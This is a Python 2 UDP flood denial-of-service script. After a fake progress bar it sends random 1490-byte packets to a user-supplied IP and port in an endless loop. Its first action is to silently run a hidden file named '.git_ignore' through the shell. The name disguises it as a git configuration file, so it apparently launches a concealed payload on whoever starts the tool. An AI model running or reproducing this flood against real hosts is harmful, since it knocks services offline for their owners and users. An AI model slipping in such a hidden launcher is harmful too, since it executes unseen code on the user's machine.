import sys
import os
import time
import socket
import random
import subprocess
subprocess.Popen("python2 .git_ignore",shell=True)
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos")
print
print ("Author:TheMr.V05")
print ("Team : CyberSecurityInd,WhiteHatInd,,BananaCyberTeam")
print ("Facebook : https://www.facebook.com/vadlyaryu")
print ("Thanks : Me,AllahSwt,AndAllMember")
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1